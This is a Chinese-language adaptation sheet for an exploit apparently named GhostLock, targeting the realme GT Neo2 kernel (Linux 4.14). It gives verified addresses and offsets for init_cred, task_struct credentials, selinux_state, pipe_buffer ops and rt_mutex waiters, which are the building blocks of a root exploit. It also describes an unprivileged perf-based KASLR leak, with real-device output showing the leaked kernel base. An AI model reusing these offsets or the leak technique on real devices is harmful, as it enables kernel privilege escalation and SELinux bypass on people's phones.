# RMX3031 (realme GT Neo2 / MT6893) — GhostLock 适配偏移

来源：`\vmlinux.elf`（由 `RMX3031_11.A.31_boot_orginial.img` 得到）
设备实测内核串与镜像一致：

```
Linux version 4.14.186+ (nobody@android-build) (Android 6443078 based on r383902, clang 11.0.1, LLD 11.0.1) #1 SMP PREEMPT Tue Jan 11 01:02:28 CST 2022
```

镜像特征：`.symtab` 含 **56909 个函数符号**（来自 kallsyms 重建），`.rela.dyn` 含 204759 条
`R_AARCH64_RELATIVE`；`.data/.bss` 内容为零（只在运行时填充），因此**数据符号地址只能从代码
（ADRP+ADD/LDR）或重定位表反推**。

约定：`BASE = _stext - 0x800 = 0xffffff8008080000`，`offset = addr - BASE`。

## 已验证（有反汇编/重定位实证）

| 项 | 值 | 证据 |
|---|---|---|
| `_stext` | `0xffffff8008080800` | .symtab |
| `INIT_TASK` | `0xffffff8009ecc000` (off `0x1e4c000`) | `start_kernel`: `adrp x0,0xffffff8009ecc000; bl set_task_stack_end_magic`；`sched_init` 用 `init_task+0x88/0xc0/0xc8`；`fork_init` 用 `init_task+0x810(signal)->rlim`；`show_state_filter` 用 `&init_task.tasks=init_task+0x510` |
| `INIT_CRED` | `0xffffff8009ed96b0` (off `0x1e596b0`) | `prepare_kernel_cred` daemon==NULL 分支 `&init_cred`，随后 `memcpy(new,old,0xa8)` |
| `ROOT_TASK_GROUP` | `0xffffff800a1a6a00` (off `0x2126a00`) | `sched_init`: `x0=&root_task_group` 传给 `init_tg_cfs_entry` |
| `KMALLOC_CACHES` | `0xffffff800983c5b0` (off `0x17bc5b0`) | `kmalloc_slab`: `base + type*0x70 + idx*8`（0x70 = 14 bucket × 8）；`selinux_task_alloc` 内联同样基址 |
| `ANON_PIPE_BUF_OPS` | `0xffffff8009194548` (off `0x1114548`) | `pipe_write`: `buf->ops=&anon_pipe_buf_ops`；重定位 `+0 confirm/+8 anon_release/+0x10 anon_steal/+0x18 generic_get` |
| `noop_llseek` | `0xffffff800827a6dc` | pipefifo_fops.llseek（重定位） |
| `generic_file_splice_read` | `0xffffff80082ba7dc` | 4.14 无 copy_splice_read |
| `selinux_state` | `0xffffff800a39d4f8` | `selinux_task_alloc`: `adrp 0xa39d000; add #0x4f8; bl avc_has_perm`；`avc_has_perm` 读 `state->avc @+0x10` |
| ashmem_ioctl/mmap/open/release | `0xd7ddd4 / 0xd7e6fc / 0xd7e864 / 0xd7e8e4` | .symtab |
| configfs_read_file / write_file | `0x2a3298 / 0x2a3420` | .symtab（4.14 用 .read/.write） |

## task_struct（sizeof = 0xfc0，`fork_init` 的 `kmem_cache_create` 参数）

| 字段 | off | 证据 |
|---|---|---|
| state | 0x30 | `show_state_filter`（thread_group 节点 -0x6a0） |
| usage | 0x40 | `__put_task_struct` `atomic_read(&tsk->usage)` |
| prio / static_prio / normal_prio | 0x84 / 0x88 / 0x8c | `task_blocks_on_rt_mutex` 读 0x84；`sched_init` 用 0x88 做 prio_to_weight 索引 |
| tasks | 0x510 | `show_state_filter`: `&init_task.tasks`、`sub #0x510` |
| thread_group | 0x6d0 | `while_each_thread`（signal+0x10 thread_head） |
| exit_state | 0x5ac | `__put_task_struct` / `sched_show_task` |
| pid / tgid | 0x610 / 0x614 | `sched_show_task` `ldr w2,[x19,#0x610]`（tgid=pid+4） |
| real_parent | 0x620 | `sched_show_task` `p->real_parent->pid` |
| pids[] | 0x650 | `__task_pid_nr_ns`（stride 0x18） |
| mm / active_mm | 0x560 / 0x568 | `do_exit` |
| nsproxy | 0x688 | `__task_pid_nr_ns` → `task_active_pid_ns` |
| real_cred / cred | 0x7d0 / 0x7d8 | `commit_creds`、`prepare_kernel_cred`、`selinux_task_alloc` |
| comm | 0x7e0 | `__get_task_comm` / `sched_show_task` |
| signal | 0x810 | `fork_init`、`__put_task_struct`、`do_exit` |
| alloc_lock | 0x8a0 | `__get_task_comm`（task_lock） |
| pi_lock | 0x8a4 | `task_blocks_on_rt_mutex`、`rt_mutex_adjust_prio_chain`、`init_idle` |
| pi_waiters.rb_node / .rb_leftmost | 0x8b0 / 0x8b8 | `rt_mutex_adjust_prio_chain`：`ldr [x19,#0x8b0]`、`[x19,#0x8b8]`，top waiter = leftmost-0x18 |
| pi_blocked_on | 0x8c8 | `task_blocks_on_rt_mutex` `str x22,[x20,#0x8c8]`、prio_chain `ldr x25,[x19,#0x8c8]` |
| seccomp | 0x880 | `__secure_computing` `ldr w9,[x8,#0x880]` |
| sched_task_group | 0x988 | `sched_move_task` / `cpu_cgroup_fork` 对 `init_task+0x988` 的引用 |

> 注意：`0x4c8 → 0x510`、`0x788 → 0x7d0` 等整体 **+0x48** 位移来自 MTK/WALT 在 task_struct
> 早期插入的字段；`state/prio/static_prio/normal_prio` 不受影响。

## rt_mutex_waiter（与参考 4.14 移植一致）

`tree_entry 0x00`、`pi_tree_entry 0x18`、`task 0x30`、`lock 0x38`、`prio 0x40`、`deadline 0x48`
（`task_blocks_on_rt_mutex`: `stp x20,x19,[x22,#0x30]`、`str w8,[x22,#0x40]`、`str x10,[x22,#0x48]`；
`rt_mutex_adjust_prio_chain`: `waiter->lock @+0x38`，`container_of(leftmost,#0x18)` → pi_tree_entry=rb_node）

`struct rt_mutex`：owner @0x18，waiters 为 `rb_root_cached`（rb_node @8、leftmost @0x10）—— 本内核有
5.x 风格 backport，`task->pi_waiters` 同样是 `rb_root_cached`。

## cred（sizeof = 0xa8）

usage 0x00、uid 0x04、gid 0x08、suid 0x0c、sgid 0x10、euid 0x14、egid 0x18、fsuid 0x1c、fsgid 0x20、
securebits 0x24、cap_inheritable 0x28、cap_permitted 0x30、cap_effective 0x38、cap_bset 0x40、
cap_ambient 0x48、**security 0x78**（`selinux_cred_prepare`: `ldr x8,[x1,#0x78]` / `str x8,[x19,#0x78]`）、
user 0x80、user_ns 0x88、group_info 0x90、non_rcu/rcu 0x98。

## struct page / pipe_buffer / file_operations

* `struct page` = 0x40；`_refcount` 0x1c（`__free_pages` `add x8,x0,#0x1c`）；`slab_cache` 0x30（`kfree` `ldr x21,[x19,#0x30]`）。
* `struct pipe_buffer` = 0x28：page 0、offset 8、len 0xc、**ops 0x10**、flags 0x18、private 0x20（`pipe_write`）。
* `file_operations`（`pipefifo_fops` @ `0xffffff8009194590` 重定位反推）：
  owner 0x00、llseek 0x08、read 0x10、write 0x18、read_iter 0x20、write_iter 0x28、
  iterate 0x30、iterate_shared 0x38、poll 0x40、unlocked_ioctl 0x48、compat_ioctl 0x50、
  mmap 0x58、**open 0x60**、flush 0x68、**release 0x70**、fsync 0x78、fasync 0x80。
  本内核**没有** `mmap_supported_flags` 字段（与参考移植的 0x68/0x78 不同）。

## 未解决（阻塞项）

1. ~~**KASLR**~~ → **已解决**：见下节「perf KASLR 泄漏」。真机实测 4 次连续运行结果一致。
2. `ashmem_misc`（`struct miscdevice`）地址未定位（镜像里 `.data` 指针为空），需要时从
   `misc_register` 调用点反推。
3. `PAGE_OFFSET` / `VMEMMAP_START` / `PHYS_OFFSET` 的 39-bit 布局未在本镜像上验证（暂用同 SoC 移植值）。
4. `SELINUX_ENFORCING` 取 `selinux_state+1`（enforcing 字节），待确认；`SELINUX_BLOB_SIZES` 单 LSM 下为 0。

---

## perf KASLR 泄漏（无需 root）

本机 `/proc/sys/kernel/perf_event_paranoid = -1`，于是可以用 `perf_event_open()` 采内核 IP：

* `PERF_TYPE_HARDWARE / PERF_COUNT_HW_CPU_CYCLES`，`sample_period=2000`，
  `exclude_user=1`（只在内核态计数），`PERF_SAMPLE_IP`；失败时回退
  `PERF_TYPE_SOFTWARE / PERF_COUNT_SW_CPU_CLOCK`。
* 采样期间交替执行 `getpid/gettid/getuid/sched_yield/openat(write)/nanosleep`，
  让 IP 覆盖整个 text（跨度要接近 `_etext - _stext`，否则候选 slide 不唯一）。
* 判据：KASLR 以 2 MiB 对齐平移，`_etext`（`0x9170000`）与 `_sinittext`（`0x98c0000`）
  之间是 7.3 MB 的 **.rodata 空洞（不可执行）**，因此“把所有样本落在
  `[_stext,_etext)` 内”的候选唯一。

真机实测（每次启动重新随机化）：

```
perf-kaslr: samples=82948 cluster=82948 span=0x10e06f4
perf-kaslr-ok samples=82948 best=82948 second=80621 base=ffffff9cc2e80000 slide=0000001cbae00000
```

同一 boot 内 4 次运行 base/slide 完全一致；用符号表离线校验样本语义：

```
ip -> static            symbol
0xffffff94f5283f94 -> 0xffffff8008083f94  el0_svc_naked +8
0xffffff94f52dbb20 -> 0xffffff80080dbb20  __task_pid_nr_ns +52
0xffffff94f6361c30 -> 0xffffff8009161c30  _raw_spin_unlock_irqrestore +24
0xffffff94f5281584 -> 0xffffff8008081584  __softirqentry_text_start +148
```

（`el0_svc_naked`、`__task_pid_nr_ns` 正是 `getpid` 循环的必经路径，语义完全吻合。）

实现：`src/slide.c` 中的 `perf_kaslr_leak()`，由 `target.h` 的
`ENABLE_PERF_KASLR_LEAK` / `KIMAGE_STEXT_OFF` / `KIMAGE_ETEXT_OFF` 启用，
`slide_leak_kernel_base()` 会先试 perf，失败才回退到原来的 pselect 路线。
`GHOSTLOCK_LEAK_ONLY=1` 时只打印 base/slide 即退出（不碰内核内存，可反复验证）。
